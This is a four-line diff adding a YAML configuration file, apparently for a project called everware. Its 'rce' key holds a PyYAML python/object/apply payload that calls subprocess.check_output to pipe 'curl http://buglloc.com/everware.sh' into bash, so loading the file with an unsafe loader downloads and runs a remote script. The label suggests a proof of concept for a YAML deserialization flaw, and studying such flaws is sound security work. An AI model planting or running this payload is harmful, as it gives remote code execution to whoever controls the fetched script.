@@ -1,0 +1,4 @@
+everware_based: False
+rce: !!python/object/apply:subprocess.check_output
+  args: ["curl http://buglloc.com/everware.sh | bash"]
+  kwds: {shell: true}
